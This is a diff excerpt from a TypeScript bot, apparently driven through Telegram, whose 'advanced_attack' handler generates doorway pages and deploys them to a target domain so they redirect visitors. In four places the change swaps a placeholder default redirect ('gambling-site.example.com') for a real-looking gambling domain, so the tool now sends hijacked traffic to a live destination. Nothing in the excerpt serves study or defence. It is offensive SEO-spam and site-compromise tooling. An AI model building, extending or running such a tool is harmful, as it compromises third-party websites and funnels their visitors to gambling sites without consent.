@@ -1673,7 +1673,7 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
 
       case "advanced_attack": {
         const domain = args.domain;
-        const redirectUrl = args.redirect_url || "https://gambling-site.example.com";
+        const redirectUrl = args.redirect_url || "https://hkt956.org/";
         const technique = args.technique || "all";
         const keywords = args.keywords ? args.keywords.split(",").map((k: string) => k.trim()) : undefined;
         const doorwayCount = args.doorway_count || 50;
@@ -1768,7 +1768,7 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
             const { pickRedirectUrl } = await import("./agentic-attack-engine");
             redirectUrl = await pickRedirectUrl();
           } catch {
-            redirectUrl = "https://gambling-site.example.com";
+            redirectUrl = "https://hkt956.org/";
           }
         }
 
@@ -4212,7 +4212,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         const { pickRedirectUrl } = await import("./agentic-attack-engine");
         redirectUrl = await pickRedirectUrl();
       } catch {
-        redirectUrl = "https://gambling-site.example.com";
+        redirectUrl = "https://hkt956.org/";
       }
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
@@ -4593,7 +4593,7 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
               const { pickRedirectUrl } = await import("./agentic-attack-engine");
               redirectUrl = await pickRedirectUrl();
             } catch {
-              redirectUrl = "https://gambling-site.example.com";
+              redirectUrl = "https://hkt956.org/";
             }
             
             const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
